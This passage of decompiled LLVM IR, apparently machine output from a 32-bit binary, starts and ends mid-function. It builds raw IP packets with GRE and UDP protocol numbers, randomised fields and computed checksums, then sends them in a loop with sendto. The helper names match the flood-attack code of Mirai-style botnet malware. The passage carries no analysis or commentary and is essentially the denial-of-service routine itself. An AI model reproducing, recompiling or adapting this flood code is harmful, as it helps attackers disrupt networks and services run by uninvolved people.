  %v1_804a8cc = add i32 %v0_804a8cc, 58
  store i32 %v1_804a8cc, i32* @edi, align 4
  %v5_804a8cf = load i32, i32* %edx.global-to-local, align 4
  %v6_804a8cf = and i32 %v5_804a8cf, -65536
  %v7_804a8cf = or i32 %v6_804a8cf, %v3_804a850
  store i32 %v7_804a8cf, i32* %edx.global-to-local, align 4
  %v0_804a8d4 = load i32, i32* @ebp, align 4
  %v1_804a8d4 = trunc i32 %v0_804a8d4 to i16
  %v3_804a8d4 = add i32 %v0_804a8cc, 2
  %v4_804a8d4 = inttoptr i32 %v3_804a8d4 to i16*
  store i16 %v1_804a8d4, i16* %v4_804a8d4, align 2
  %v0_804a8d8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a8d8 = trunc i32 %v0_804a8d8 to i16
  %v2_804a8d8 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804a8d8 = add i32 %v2_804a8d8, 4
  %v4_804a8d8 = inttoptr i32 %v3_804a8d8 to i16*
  store i16 %v1_804a8d8, i16* %v4_804a8d8, align 2
  %v5_804a8dc = load i32, i32* %edx.global-to-local, align 4
  %v6_804a8dc = and i32 %v5_804a8dc, -256
  %v7_804a8dc = or i32 %v6_804a8dc, %v4_804a8dc
  store i32 %v7_804a8dc, i32* %edx.global-to-local, align 4
  %v2_804a8e3 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804a8e3 = add i32 %v2_804a8e3, 8
  %v4_804a8e3 = inttoptr i32 %v3_804a8e3 to i8*
  store i8 %v6_804a70c, i8* %v4_804a8e3, align 1
  br i1 %v4_804a8e6, label %dec_label_pc_804a8f3, label %dec_label_pc_804a8ed

dec_label_pc_804a8ed:                             ; preds = %dec_label_pc_804a899
  %v0_804a8ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a8ed = add i32 %v0_804a8ed, 6
  %v2_804a8ed = inttoptr i32 %v1_804a8ed to i16*
  store i16 64, i16* %v2_804a8ed, align 2
  br label %dec_label_pc_804a8f3

dec_label_pc_804a8f3:                             ; preds = %dec_label_pc_804a899, %dec_label_pc_804a8ed
  %v0_804a8f3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a8f3 = add i32 %v0_804a8f3, 9
  %v2_804a8f3 = inttoptr i32 %v1_804a8f3 to i8*
  store i8 47, i8* %v2_804a8f3, align 1
  %v0_804a8f7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a8f7 = mul i32 %v0_804a8f7, 3
  store i32 %v3_804a8f7, i32* %eax.global-to-local, align 4
  store i32 %v5_804a78b, i32* %edx.global-to-local, align 4
  %v0_804a8fe = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a8fe = add i32 %v0_804a8fe, 2
  %v2_804a8fe = inttoptr i32 %v1_804a8fe to i16*
  store i16 22629, i16* %v2_804a8fe, align 2
  %v0_804a904 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a904 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a904 = add i32 %v1_804a904, 12
  %v3_804a904 = inttoptr i32 %v2_804a904 to i32*
  store i32 %v0_804a904, i32* %v3_804a904, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_804a90e = load i32, i32* %eax.global-to-local, align 4
  %v2_804a90e = mul i32 %v1_804a90e, 8
  %v4_804a90e = add i32 %v3_804a90e, %v2_804a90e
  %v5_804a90e = inttoptr i32 %v4_804a90e to i32*
  %v6_804a90e = load i32, i32* %v5_804a90e, align 4
  %v1_804a912 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a912 = add i32 %v1_804a912, 16
  %v3_804a912 = inttoptr i32 %v2_804a912 to i32*
  store i32 %v6_804a90e, i32* %v3_804a912, align 4
  %v1_804a919 = add i32 %v5_804a8b2, 36
  %v2_804a919 = inttoptr i32 %v1_804a919 to i16*
  store i16 8, i16* %v2_804a919, align 2
  %v0_804a91f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a91f = add i32 %v0_804a91f, 38
  %v2_804a91f = inttoptr i32 %v1_804a91f to i8*
  store i8 69, i8* %v2_804a91f, align 1
  %v5_804a923 = load i32, i32* %edx.global-to-local, align 4
  %v6_804a923 = and i32 %v5_804a923, -256
  %v7_804a923 = or i32 %v6_804a923, %v4_804a8c2
  store i32 %v7_804a923, i32* %edx.global-to-local, align 4
  %v2_804a927 = load i32, i32* @esi, align 4
  %v3_804a927 = add i32 %v2_804a927, 1
  %v4_804a927 = inttoptr i32 %v3_804a927 to i8*
  store i8 %v6_804a6e8, i8* %v4_804a927, align 1
  %v2_804a933 = load i32, i32* @esi, align 4
  %v3_804a933 = add i32 %v2_804a933, 2
  %v4_804a933 = inttoptr i32 %v3_804a933 to i16*
  store i16 %v2_804a92f, i16* %v4_804a933, align 2
  store i32 %v6_804a93b, i32* %eax.global-to-local, align 4
  %v2_804a93f = load i32, i32* @esi, align 4
  %v3_804a93f = add i32 %v2_804a93f, 4
  %v4_804a93f = inttoptr i32 %v3_804a93f to i16*
  store i16 %v2_804a93b, i16* %v4_804a93f, align 2
  %v5_804a943 = load i32, i32* %eax.global-to-local, align 4
  %v6_804a943 = and i32 %v5_804a943, -256
  %v7_804a943 = or i32 %v6_804a943, %v4_804a8dc
  store i32 %v7_804a943, i32* %eax.global-to-local, align 4
  %v2_804a947 = load i32, i32* @esi, align 4
  %v3_804a947 = add i32 %v2_804a947, 8
  %v4_804a947 = inttoptr i32 %v3_804a947 to i8*
  store i8 %v6_804a70c, i8* %v4_804a947, align 1
  br i1 %v4_804a8e6, label %dec_label_pc_804a957, label %dec_label_pc_804a951

dec_label_pc_804a951:                             ; preds = %dec_label_pc_804a8f3
  %v0_804a951 = load i32, i32* @esi, align 4
  %v1_804a951 = add i32 %v0_804a951, 6
  %v2_804a951 = inttoptr i32 %v1_804a951 to i16*
  store i16 64, i16* %v2_804a951, align 2
  br label %dec_label_pc_804a957

dec_label_pc_804a957:                             ; preds = %dec_label_pc_804a8f3, %dec_label_pc_804a951
  %v0_804a957 = load i32, i32* @esi, align 4
  %v1_804a957 = add i32 %v0_804a957, 9
  %v2_804a957 = inttoptr i32 %v1_804a957 to i8*
  store i8 17, i8* %v2_804a957, align 1
  %v1_804a95b = call i32 @rand_next(i32 %v1_804a8b5)
  store i32 %v1_804a95b, i32* %eax.global-to-local, align 4
  %v1_804a965 = load i32, i32* @esi, align 4
  %v2_804a965 = add i32 %v1_804a965, 12
  %v3_804a965 = inttoptr i32 %v2_804a965 to i32*
  store i32 %v1_804a95b, i32* %v3_804a965, align 4
  br i1 %v1_804a968, label %dec_label_pc_804a85b, label %dec_label_pc_804a96e

dec_label_pc_804a96e:                             ; preds = %dec_label_pc_804a957
  %v3_804a96e = sub i32 1023, %v1_804a95b
  store i32 %v3_804a96e, i32* %eax.global-to-local, align 4
  %v1_804a976 = load i32, i32* @esi, align 4
  %v2_804a976 = add i32 %v1_804a976, 16
  %v3_804a976 = inttoptr i32 %v2_804a976 to i32*
  store i32 %v3_804a96e, i32* %v3_804a976, align 4
  br label %dec_label_pc_804a861

dec_label_pc_804a97e:                             ; preds = %dec_label_pc_804a7c9
  store i32 %v3_804a7b6, i32* @eax, align 4
  %v1_804a986 = call i32 @__GI___libc_close(i32 %v3_804a7b6)
  store i32 %v1_804a986, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a98e

dec_label_pc_804a98e:                             ; preds = %entry, %dec_label_pc_804a97e
  %v0_804a995 = phi i32 [ 0, %entry ], [ %v1_804a986, %dec_label_pc_804a97e ]
  store i32 %v0_804a6a3, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804a995

dec_label_pc_804a996.loopexit:                    ; preds = %dec_label_pc_804a861
  %v0_804a9a1.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a996

dec_label_pc_804a996:                             ; preds = %dec_label_pc_804a7f3.dec_label_pc_804a996_crit_edge, %dec_label_pc_804a996.loopexit
  %v1_804a99a.pre-phi = phi i32 [ %.pre, %dec_label_pc_804a7f3.dec_label_pc_804a996_crit_edge ], [ %v1_804a838, %dec_label_pc_804a996.loopexit ]
  %v0_804a9a1.pre = phi i32 [ %v12_804a6f1, %dec_label_pc_804a7f3.dec_label_pc_804a996_crit_edge ], [ %v0_804a9a1.pre.pre, %dec_label_pc_804a996.loopexit ]
  store i32 %v1_804a99a.pre-phi, i32* %edx.global-to-local, align 4
  %v1_804ac37 = inttoptr i32 %v1_804a99a.pre-phi to i32*
  %v2_804ac1c = inttoptr i32 %v1_804a99a.pre-phi to i8*
  %v2_804aa91 = inttoptr i32 %v1_804a99a.pre-phi to i16*
  %v3_804aac5 = inttoptr i32 %v4_804a6a9 to i16*
  br label %dec_label_pc_804a9a1

dec_label_pc_804a9a1:                             ; preds = %dec_label_pc_804ac32, %dec_label_pc_804a996
  %v0_804a9a1 = phi i32 [ %v1_804ac3c, %dec_label_pc_804ac32 ], [ %v0_804a9a1.pre, %dec_label_pc_804a996 ]
  %v1_804a9a1 = add i32 %v0_804a9a1, 104
  %v2_804a9a1 = inttoptr i32 %v1_804a9a1 to i32*
  store i32 0, i32* %v2_804a9a1, align 4
  %v0_804a9a9 = load i32, i32* @esp, align 4
  %v1_804a9a9 = add i32 %v0_804a9a9, 31
  %v2_804a9a9 = inttoptr i32 %v1_804a9a9 to i8*
  %v3_804a9a9 = load i8, i8* %v2_804a9a9, align 1
  %v4_804a9a9 = icmp eq i8 %v3_804a9a9, 0
  br i1 %v4_804a9a9, label %dec_label_pc_804ac32, label %dec_label_pc_804a9b4

dec_label_pc_804a9b4:                             ; preds = %dec_label_pc_804a9a1
  %v1_804a9b4 = add i32 %v0_804a9a9, 64
  %v2_804a9b4 = inttoptr i32 %v1_804a9b4 to i32*
  %v3_804a9b4 = load i32, i32* %v2_804a9b4, align 4
  %v1_804a9b8 = add i32 %v3_804a9b4, 66
  %v2_804a9bb = add i32 %v0_804a9a9, 88
  %v3_804a9bb = inttoptr i32 %v2_804a9bb to i32*
  store i32 %v1_804a9b8, i32* %v3_804a9bb, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ab2a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ab2a

dec_label_pc_804a9c6:                             ; preds = %dec_label_pc_804ab2a
  %v1_804a9c6 = add i32 %v0_804ab3e, 44
  %v2_804a9c6 = inttoptr i32 %v1_804a9c6 to i32*
  %v3_804a9c6 = load i32, i32* %v2_804a9c6, align 4
  %v13_804a9c6 = icmp eq i32 %v3_804a9c6, -1
  br i1 %v13_804a9c6, label %dec_label_pc_804aba0, label %dec_label_pc_804a9d1

dec_label_pc_804a9d1:                             ; preds = %.dec_label_pc_804a9d1_crit_edge, %dec_label_pc_804a9c6
  %v0_804a9d1 = phi i32 [ %v0_804a9d1.pre, %.dec_label_pc_804a9d1_crit_edge ], [ %v0_804ab3e, %dec_label_pc_804a9c6 ]
  %v1_804a9d1 = add i32 %v0_804a9d1, 56
  %v2_804a9d1 = inttoptr i32 %v1_804a9d1 to i16*
  %v3_804a9d1 = load i16, i16* %v2_804a9d1, align 2
  %v13_804a9d1 = icmp eq i16 %v3_804a9d1, -1
  br i1 %v13_804a9d1, label %dec_label_pc_804abb4, label %dec_label_pc_804a9dd

dec_label_pc_804a9dd:                             ; preds = %dec_label_pc_804aba0.dec_label_pc_804a9dd_crit_edge, %dec_label_pc_804a9d1
  %v0_804a9dd = phi i32 [ %v0_804a9dd.pre, %dec_label_pc_804aba0.dec_label_pc_804a9dd_crit_edge ], [ %v0_804a9d1, %dec_label_pc_804a9d1 ]
  %v1_804a9dd = add i32 %v0_804a9dd, 60
  %v2_804a9dd = inttoptr i32 %v1_804a9dd to i16*
  %v3_804a9dd = load i16, i16* %v2_804a9dd, align 2
  %v13_804a9dd = icmp eq i16 %v3_804a9dd, -1
  br i1 %v13_804a9dd, label %dec_label_pc_804abd5, label %dec_label_pc_804a9e9

dec_label_pc_804a9e9:                             ; preds = %dec_label_pc_804abb4, %dec_label_pc_804a9dd
  %v0_804a9e9 = phi i32 [ %v0_804abc9, %dec_label_pc_804abb4 ], [ %v0_804a9dd, %dec_label_pc_804a9dd ]
  %v1_804a9e9 = add i32 %v0_804a9e9, 62
  %v2_804a9e9 = inttoptr i32 %v1_804a9e9 to i16*
  %v3_804a9e9 = load i16, i16* %v2_804a9e9, align 2
  %v13_804a9e9 = icmp eq i16 %v3_804a9e9, -1
  br i1 %v13_804a9e9, label %dec_label_pc_804abf0, label %dec_label_pc_804a9f5

dec_label_pc_804a9f5:                             ; preds = %dec_label_pc_804abd5.dec_label_pc_804a9f5_crit_edge, %dec_label_pc_804a9e9
  %v0_804a9f5 = phi i32 [ %v0_804a9f5.pre, %dec_label_pc_804abd5.dec_label_pc_804a9f5_crit_edge ], [ %v0_804a9e9, %dec_label_pc_804a9e9 ]
  %v1_804a9f5 = add i32 %v0_804a9f5, 71
  %v2_804a9f5 = inttoptr i32 %v1_804a9f5 to i8*
  %v3_804a9f5 = load i8, i8* %v2_804a9f5, align 1
  %v4_804a9f5 = icmp eq i8 %v3_804a9f5, 0
  br i1 %v4_804a9f5, label %dec_label_pc_804ac04, label %dec_label_pc_804aa00

dec_label_pc_804aa00:                             ; preds = %dec_label_pc_804abf0, %dec_label_pc_804a9f5
  %v0_804aa00 = load i32, i32* @esi, align 4
  %v1_804aa00 = add i32 %v0_804aa00, 16
  %v2_804aa00 = inttoptr i32 %v1_804aa00 to i32*
  %v3_804aa00 = load i32, i32* %v2_804aa00, align 4
  store i32 %v3_804aa00, i32* %eax.global-to-local, align 4
  %v1_804aa03 = load i32, i32* @edi, align 4
  %v2_804aa03 = add i32 %v1_804aa03, 16
  %v3_804aa03 = inttoptr i32 %v2_804aa03 to i32*
  store i32 %v3_804aa00, i32* %v3_804aa03, align 4
  br label %dec_label_pc_804aa06

dec_label_pc_804aa06:                             ; preds = %dec_label_pc_804ac04, %dec_label_pc_804aa00
  %v1_804aa06 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  store i32 %v1_804aa06, i32* %eax.global-to-local, align 4
  %v1_804aa0b = load i32, i32* @esp, align 4
  %v2_804aa0b = add i32 %v1_804aa0b, 100
  %v3_804aa0b = inttoptr i32 %v2_804aa0b to i32*
  store i32 %v1_804aa06, i32* %v3_804aa0b, align 4
  %v1_804aa0f = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  store i32 %v1_804aa0f, i32* %eax.global-to-local, align 4
  %v1_804aa14 = load i32, i32* @esp, align 4
  %v2_804aa14 = add i32 %v1_804aa14, 96
  %v3_804aa14 = inttoptr i32 %v2_804aa14 to i32*
  store i32 %v1_804aa0f, i32* %v3_804aa14, align 4
  %v1_804aa18 = call i32 @rand_next(i32 %v1_804a99a.pre-phi)
  %v1_804aa1d = load i32, i32* @esp, align 4
  %v2_804aa1d = add i32 %v1_804aa1d, 92
  %v3_804aa1d = inttoptr i32 %v2_804aa1d to i32*
  store i32 %v1_804aa18, i32* %v3_804aa1d, align 4
  %v1_804aa21 = load i32, i32* @esp, align 4
  %v2_804aa21 = add i32 %v1_804aa21, -4
  %v3_804aa21 = inttoptr i32 %v2_804aa21 to i32*
  store i32 %v1_804aa18, i32* %v3_804aa21, align 4
  %v1_804aa22 = add i32 %v1_804aa21, -8
  %v2_804aa22 = inttoptr i32 %v1_804aa22 to i32*
  store i32 4, i32* %v2_804aa22, align 4
  %v1_804aa24 = add i32 %v1_804aa21, 100
  store i32 %v1_804aa24, i32* %eax.global-to-local, align 4
  %v2_804aa28 = add i32 %v1_804aa21, -12
  %v3_804aa28 = inttoptr i32 %v2_804aa28 to i32*
  store i32 %v1_804aa24, i32* %v3_804aa28, align 4
  %v1_804aa29 = add i32 %v1_804aa21, 76
  %v2_804aa29 = inttoptr i32 %v1_804aa29 to i32*
  %v3_804aa29 = load i32, i32* %v2_804aa29, align 4
  store i32 %v3_804aa29, i32* @ebx, align 4
  %v2_804aa2d = add i32 %v1_804aa21, -16
  %v3_804aa2d = inttoptr i32 %v2_804aa2d to i32*
  store i32 %v3_804aa29, i32* %v3_804aa2d, align 4
  %v3_804aa2e = call i32 @util_memcpy(i32 %v1_804a99a.pre-phi, i32 %v4_804a6a9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804aa2e, i32* %eax.global-to-local, align 4
  %v0_804aa33 = load i32, i32* @esp, align 4
  %v1_804aa36 = add i32 %v0_804aa33, 8
  %v2_804aa36 = inttoptr i32 %v1_804aa36 to i32*
  store i32 4, i32* %v2_804aa36, align 4
  %v1_804aa38 = add i32 %v0_804aa33, 112
  store i32 %v1_804aa38, i32* %edx.global-to-local, align 4
  %v2_804aa3c = add i32 %v0_804aa33, 4
  %v3_804aa3c = inttoptr i32 %v2_804aa3c to i32*
  store i32 %v1_804aa38, i32* %v3_804aa3c, align 4
  %v1_804aa3d = add i32 %v0_804aa33, 92
  %v2_804aa3d = inttoptr i32 %v1_804aa3d to i32*
  %v3_804aa3d = load i32, i32* %v2_804aa3d, align 4
  %v1_804aa41 = add i32 %v3_804aa3d, 6
  store i32 %v1_804aa41, i32* %eax.global-to-local, align 4
  %v3_804aa44 = inttoptr i32 %v0_804aa33 to i32*
  store i32 %v1_804aa41, i32* %v3_804aa44, align 4
  %v3_804aa45 = call i32 @util_memcpy(i32 %v1_804a99a.pre-phi, i32 %v4_804a6a9, i32 ptrtoint (i32* @0 to i32))
  %v0_804aa4a = load i32, i32* @esp, align 4
  %v1_804aa4d = add i32 %v0_804aa4a, 8
  %v2_804aa4d = inttoptr i32 %v1_804aa4d to i32*
  store i32 2, i32* %v2_804aa4d, align 4
  %v1_804aa4f = add i32 %v0_804aa4a, 108
  store i32 %v1_804aa4f, i32* %eax.global-to-local, align 4
  %v2_804aa53 = add i32 %v0_804aa4a, 4
  %v3_804aa53 = inttoptr i32 %v2_804aa53 to i32*
  store i32 %v1_804aa4f, i32* %v3_804aa53, align 4
  %v1_804aa54 = add i32 %v0_804aa4a, 92
  %v2_804aa54 = inttoptr i32 %v1_804aa54 to i32*
  %v3_804aa54 = load i32, i32* %v2_804aa54, align 4
  %v1_804aa58 = add i32 %v3_804aa54, 4
  store i32 %v1_804aa58, i32* %eax.global-to-local, align 4
  %v3_804aa5b = inttoptr i32 %v0_804aa4a to i32*
  store i32 %v1_804aa58, i32* %v3_804aa5b, align 4
  %v3_804aa5c = call i32 @util_memcpy(i32 %v1_804a99a.pre-phi, i32 %v4_804a6a9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804aa5c, i32* %eax.global-to-local, align 4
  %v0_804aa61 = load i32, i32* @esp, align 4
  %v1_804aa64 = add i32 %v0_804aa61, 8
  %v2_804aa64 = inttoptr i32 %v1_804aa64 to i32*
  store i32 2, i32* %v2_804aa64, align 4
  %v1_804aa66 = add i32 %v0_804aa61, 110
  store i32 %v1_804aa66, i32* %edx.global-to-local, align 4
  %v2_804aa6a = add i32 %v0_804aa61, 4
  %v3_804aa6a = inttoptr i32 %v2_804aa6a to i32*
  store i32 %v1_804aa66, i32* %v3_804aa6a, align 4
  %v1_804aa6b = add i32 %v0_804aa61, 92
  %v2_804aa6b = inttoptr i32 %v1_804aa6b to i32*
  %v3_804aa6b = load i32, i32* %v2_804aa6b, align 4
  %v1_804aa6f = add i32 %v3_804aa6b, 10
  store i32 %v1_804aa6f, i32* %eax.global-to-local, align 4
  %v3_804aa72 = inttoptr i32 %v0_804aa61 to i32*
  store i32 %v1_804aa6f, i32* %v3_804aa72, align 4
  %v3_804aa73 = call i32 @util_memcpy(i32 %v1_804a99a.pre-phi, i32 %v4_804a6a9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804aa73, i32* %eax.global-to-local, align 4
  %v0_804aa78 = load i32, i32* @esp, align 4
  %v1_804aa7b = add i32 %v0_804aa78, 86
  %v2_804aa7b = inttoptr i32 %v1_804aa7b to i8*
  %v3_804aa7b = load i8, i8* %v2_804aa7b, align 1
  %v4_804aa7b = icmp eq i8 %v3_804aa7b, 0
  %v1_804aa80 = icmp eq i1 %v4_804aa7b, false
  br i1 %v1_804aa80, label %dec_label_pc_804ac11, label %dec_label_pc_804aa86

dec_label_pc_804aa86:                             ; preds = %dec_label_pc_804aa06, %dec_label_pc_804ac11
  %v0_804aa86 = load i32, i32* @esi, align 4
  %v1_804aa86 = add i32 %v0_804aa86, 10
  %v2_804aa86 = inttoptr i32 %v1_804aa86 to i16*
  store i16 0, i16* %v2_804aa86, align 2
  %v0_804aa8c = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa8c = load i32, i32* @esp, align 4
  %v2_804aa8c = add i32 %v1_804aa8c, -4
  %v3_804aa8c = inttoptr i32 %v2_804aa8c to i32*
  store i32 %v0_804aa8c, i32* %v3_804aa8c, align 4
  %v0_804aa8d = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa8d = add i32 %v1_804aa8c, -8
  %v3_804aa8d = inttoptr i32 %v2_804aa8d to i32*
  store i32 %v0_804aa8d, i32* %v3_804aa8d, align 4
  %v1_804aa8e = add i32 %v1_804aa8c, -12
  %v2_804aa8e = inttoptr i32 %v1_804aa8e to i32*
  store i32 20, i32* %v2_804aa8e, align 4
  %v0_804aa90 = load i32, i32* @esi, align 4
  %v2_804aa90 = add i32 %v1_804aa8c, -16
  %v3_804aa90 = inttoptr i32 %v2_804aa90 to i32*
  store i32 %v0_804aa90, i32* %v3_804aa90, align 4
  %v3_804aa91 = call i32 @checksum_generic(i16* %v2_804aa91, i32 %v4_804a6a9)
  %v4_804aa91 = trunc i32 %v3_804aa91 to i16
  store i32 %v3_804aa91, i32* %eax.global-to-local, align 4
  %v3_804aa96 = load i32, i32* @esi, align 4
  %v4_804aa96 = add i32 %v3_804aa96, 10
  %v5_804aa96 = inttoptr i32 %v4_804aa96 to i16*
  store i16 %v4_804aa91, i16* %v5_804aa96, align 2
  %v0_804aa9a = load i32, i32* @edi, align 4
  %v1_804aa9a = add i32 %v0_804aa9a, 10
  %v2_804aa9a = inttoptr i32 %v1_804aa9a to i16*
  store i16 0, i16* %v2_804aa9a, align 2
  %v0_804aaa0 = load i32, i32* @esp, align 4
  %v1_804aaa0 = inttoptr i32 %v0_804aaa0 to i32*
  %v2_804aaa0 = load i32, i32* %v1_804aaa0, align 4
  store i32 %v2_804aaa0, i32* @ebx, align 4
  %v3_804aaa0 = add i32 %v0_804aaa0, 4
  %v1_804aaa1 = inttoptr i32 %v3_804aaa0 to i32*
  %v2_804aaa1 = load i32, i32* %v1_804aaa1, align 4
  store i32 %v2_804aaa1, i32* %eax.global-to-local, align 4
  store i32 20, i32* %v1_804aaa1, align 4
  %v0_804aaa4 = load i32, i32* @edi, align 4
  store i32 %v0_804aaa4, i32* %v1_804aaa0, align 4
  %v3_804aaa5 = call i32 @checksum_generic(i16* %v2_804aa91, i32 %v4_804a6a9)
  %v4_804aaa5 = trunc i32 %v3_804aaa5 to i16
  store i32 %v3_804aaa5, i32* %eax.global-to-local, align 4
  %v0_804aaaa = load i32, i32* @esp, align 4
  %v1_804aaaa = add i32 %v0_804aaaa, 36
  %v2_804aaaa = inttoptr i32 %v1_804aaaa to i32*
  %v3_804aaaa = load i32, i32* %v2_804aaaa, align 4
  store i32 %v3_804aaaa, i32* %ecx.global-to-local, align 4
  %v3_804aaae = load i32, i32* @edi, align 4
  %v4_804aaae = add i32 %v3_804aaae, 10
  %v5_804aaae = inttoptr i32 %v4_804aaae to i16*
  store i16 %v4_804aaa5, i16* %v5_804aaae, align 2
  %v0_804aab2 = load i32, i32* @ebp, align 4
  %v1_804aab2 = add i32 %v0_804aab2, 6
  %v2_804aab2 = inttoptr i32 %v1_804aab2 to i16*
  store i16 0, i16* %v2_804aab2, align 2
  %v0_804aab8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804aab8 = load i32, i32* @esp, align 4
  %v2_804aab8 = add i32 %v1_804aab8, -4
  %v3_804aab8 = inttoptr i32 %v2_804aab8 to i32*
  store i32 %v0_804aab8, i32* %v3_804aab8, align 4
  %v0_804aab9 = load i32, i32* @ebp, align 4
  %v1_804aab9 = add i32 %v0_804aab9, 4
  %v2_804aab9 = inttoptr i32 %v1_804aab9 to i16*
  %v3_804aab9 = load i16, i16* %v2_804aab9, align 2
  %v4_804aab9 = zext i16 %v3_804aab9 to i32
  store i32 %v4_804aab9, i32* %eax.global-to-local, align 4
  %v2_804aac2 = add i32 %v1_804aab8, -8
  %v3_804aac2 = inttoptr i32 %v2_804aac2 to i32*
  store i32 %v4_804aab9, i32* %v3_804aac2, align 4
  %v0_804aac3 = load i32, i32* @ebp, align 4
  %v2_804aac3 = add i32 %v1_804aab8, -12
  %v3_804aac3 = inttoptr i32 %v2_804aac3 to i32*
  store i32 %v0_804aac3, i32* %v3_804aac3, align 4
  %v0_804aac4 = load i32, i32* @edi, align 4
  %v2_804aac4 = add i32 %v1_804aab8, -16
  %v3_804aac4 = inttoptr i32 %v2_804aac4 to i32*
  store i32 %v0_804aac4, i32* %v3_804aac4, align 4
  %v4_804aac5 = call i32 @checksum_tcpudp(i32 %v1_804a99a.pre-phi, i16* %v3_804aac5, i32 ptrtoint (i32* @0 to i32))
  %v5_804aac5 = trunc i32 %v4_804aac5 to i16
  store i32 %v4_804aac5, i32* %eax.global-to-local, align 4
  %v3_804aaca = load i32, i32* @ebp, align 4
  %v4_804aaca = add i32 %v3_804aaca, 6
  %v5_804aaca = inttoptr i32 %v4_804aaca to i16*
  store i16 %v5_804aac5, i16* %v5_804aaca, align 2
  %v0_804aace = load i32, i32* @esp, align 4
  %v1_804aace = add i32 %v0_804aace, 136
  %v2_804aace = inttoptr i32 %v1_804aace to i32*
  %v3_804aace = load i32, i32* %v2_804aace, align 4
  store i32 %v3_804aace, i32* %eax.global-to-local, align 4
  %v1_804aad5 = add i32 %v0_804aace, 168
  %v2_804aad5 = inttoptr i32 %v1_804aad5 to i32*
  %v3_804aad5 = load i32, i32* %v2_804aad5, align 4
  store i32 %v3_804aad5, i32* %edx.global-to-local, align 4
  %v2_804aae2 = mul i32 %v3_804aace, 24
  %v3_804aae2 = add i32 %v3_804aad5, %v2_804aae2
  store i32 %v3_804aae2, i32* %eax.global-to-local, align 4
  %v0_804aae5 = load i32, i32* @esi, align 4
  %v1_804aae5 = add i32 %v0_804aae5, 16
  %v2_804aae5 = inttoptr i32 %v1_804aae5 to i32*
  %v3_804aae5 = load i32, i32* %v2_804aae5, align 4
  store i32 %v3_804aae5, i32* %edx.global-to-local, align 4
  %v2_804aae8 = add i32 %v3_804aae2, 4
  %v3_804aae8 = inttoptr i32 %v2_804aae8 to i32*
  store i32 %v3_804aae5, i32* %v3_804aae8, align 4
  %v0_804aaeb = load i32, i32* %eax.global-to-local, align 4
  %v1_804aaeb = inttoptr i32 %v0_804aaeb to i16*
  store i16 2, i16* %v1_804aaeb, align 2
  %v0_804aaf0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aaf0 = add i32 %v0_804aaf0, 2
  %v2_804aaf0 = inttoptr i32 %v1_804aaf0 to i16*
  store i16 0, i16* %v2_804aaf0, align 2
  %v0_804aaf6 = load i32, i32* @esp, align 4
  %v1_804aaf6 = add i32 %v0_804aaf6, -4
  %v2_804aaf6 = inttoptr i32 %v1_804aaf6 to i32*
  store i32 16, i32* %v2_804aaf6, align 4
  %v0_804aaf8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aaf8 = add i32 %v0_804aaf6, -8
  %v3_804aaf8 = inttoptr i32 %v2_804aaf8 to i32*
  store i32 %v0_804aaf8, i32* %v3_804aaf8, align 4
  %v1_804aaf9 = add i32 %v0_804aaf6, -12
  %v2_804aaf9 = inttoptr i32 %v1_804aaf9 to i32*
  store i32 16384, i32* %v2_804aaf9, align 4
  %v1_804aafe = add i32 %v0_804aaf6, 96
  %v2_804aafe = inttoptr i32 %v1_804aafe to i32*
  %v3_804aafe = load i32, i32* %v2_804aafe, align 4
  store i32 %v3_804aafe, i32* %edx.global-to-local, align 4
  %v2_804ab02 = add i32 %v0_804aaf6, -16
  %v3_804ab02 = inttoptr i32 %v2_804ab02 to i32*
  store i32 %v3_804aafe, i32* %v3_804ab02, align 4
  %v0_804ab03 = load i32, i32* @esi, align 4
  %v2_804ab03 = add i32 %v0_804aaf6, -20
  %v3_804ab03 = inttoptr i32 %v2_804ab03 to i32*
  store i32 %v0_804ab03, i32* %v3_804ab03, align 4
  %v1_804ab04 = add i32 %v0_804aaf6, 56
  %v2_804ab04 = inttoptr i32 %v1_804ab04 to i32*
  %v3_804ab04 = load i32, i32* %v2_804ab04, align 4
  store i32 %v3_804ab04, i32* %eax.global-to-local, align 4
  %v2_804ab08 = add i32 %v0_804aaf6, -24
  %v3_804ab08 = inttoptr i32 %v2_804ab08 to i32*
  store i32 %v3_804ab04, i32* %v3_804ab08, align 4
  %v6_804ab09 = call i32 @__libc_sendto(i32 %v1_804a99a.pre-phi, i32 %v4_804a6a9, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804ab09, i32* %eax.global-to-local, align 4
  %v0_804ab0e = load i32, i32* @esp, align 4
  %v1_804ab0e = add i32 %v0_804ab0e, 136
  %v2_804ab0e = inttoptr i32 %v1_804ab0e to i32*
  %v3_804ab0e = load i32, i32* %v2_804ab0e, align 4
  %v1_804ab15 = add i32 %v3_804ab0e, 1
  store i32 %v1_804ab15, i32* %eax.global-to-local, align 4
  store i32 %v1_804ab15, i32* %v2_804ab0e, align 4
  %v0_804ab1d = load i32, i32* @esp, align 4
  %v1_804ab1d = add i32 %v0_804ab1d, 32
  %v0_804ab20 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab20 = add i32 %v0_804ab1d, 56
